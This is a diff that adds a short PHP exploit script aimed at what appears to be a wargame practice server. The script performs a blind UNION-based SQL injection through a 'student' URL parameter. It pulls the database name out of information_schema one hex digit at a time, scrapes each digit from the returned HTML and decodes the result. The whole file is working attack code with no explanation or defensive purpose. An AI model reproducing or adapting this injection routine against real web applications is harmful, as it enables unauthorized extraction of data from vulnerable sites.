@@ -1,0 +1,29 @@
+<?Php
+/*
+zeroday?
+xSeN nedeN GoTsUN ?
+*/
+$siz=2;
+$biz=NULL;
+$call=NULL;
+function payload($bir,$iki){
+$vec=chr(32).'or true union select 9,(select substr(hex(substr(db,'.$bir.',1)),'.$iki.',1) from information_schema.PROCESSLIST limit 0,1) from score GROUP BY score.point';
+  return $vec;
+}
+for ($b=1; $b <=1; $b++) { 
+	for ($i=1; $i <=$siz; $i++) { 
+$dis='http://ex.wargame.vn:8080/study/student.php?student=8.'.urlencode(payload($b,$i));
+		$naj=file_get_contents($dis);
+		preg_match("/<\/td><td>8<\/td><\/tr><tr><td><a href=\?student=9>9<\/a><\/td><td>([0-9])<\/td><\/tr><\/table>/i", $naj,$cix);
+				$call.=trim($cix[1]);
+									}
+								}
+$string=$call;
+function hexadec($string,$dec=NULL){
+for($i=0; $i<strlen($string); $i+=2){
+$dec.=chr(hexdec($string[$i].$string[$i+1]));
+}
+return $dec;
+}
+echo hexadec($string);
+?>
